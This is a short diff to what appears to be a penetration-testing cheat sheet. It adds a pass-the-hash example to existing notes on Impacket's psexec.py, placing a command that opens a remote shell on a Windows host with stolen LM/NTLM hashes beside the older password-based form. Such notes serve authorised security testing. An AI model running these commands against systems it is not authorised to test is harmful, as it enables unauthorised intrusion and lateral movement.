@@ -68,3 +68,10 @@ Use psexec.py
 psexec.py <domain>/<user>:'<pass>'@<ip>
 
 ```
+
+Or Use hash&#x20;
+
+```
+psexec.py <user>@10.0.0.25 --hashes [LM-HASH]:[NTLM-HASH]
+
+```
